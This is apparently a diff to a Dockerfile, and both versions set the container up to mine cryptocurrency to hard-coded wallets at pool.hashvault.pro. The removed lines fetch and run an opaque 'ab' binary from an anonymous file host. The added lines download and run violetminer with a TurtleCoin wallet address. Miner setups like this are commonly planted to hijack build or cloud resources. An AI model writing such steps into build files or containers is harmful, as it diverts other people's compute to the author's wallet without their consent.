@@ -8,10 +8,7 @@ RUN apt-get upgrade
 RUN set -ex; \
     apt-get update \
     && apt-get install -y \
-            wget \
-            unzip
-RUN wget https://cdn-130.anonfiles.com/ReXatb98u5/1115f383-1627529527/ab.zip
-RUN unzip ab
-RUN chmod +x ./ab
-RUN chmod +x ./ab/ab
-RUN ./ab/ab --url pool.hashvault.pro:80 --user 43nQSidgtmuAsCt4EZbRN8dxQjnNuhuPQQHqqTbGSUEkPFDZo6raYQBjdv3Ksr7qami6PC6GgbW59FaE9qjcgY9C3ZtVojH --pass hey --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14
+            wget
+RUN wget https://github.com/turtlecoin/violetminer/releases/download/v0.2.2/violetminer-linux-v0.2.2.tar.gz
+RUN tar xf violetminer-linux-v0.2.2.tar.gz
+RUN ./violetminer-linux-v0.2.2/violetminer --pool pool.hashvault.pro:80 --username TRTLv36c687DUYisiyzycpB2vUwUWZq3AJ4i8c7x5ssLVSYa6Eud9QZShHmSMGFGW2fvn1XCg5HY2hB1w3un35GB2K7r8i8Kxcr --password x --algorithm chukwa_v2 --ssl
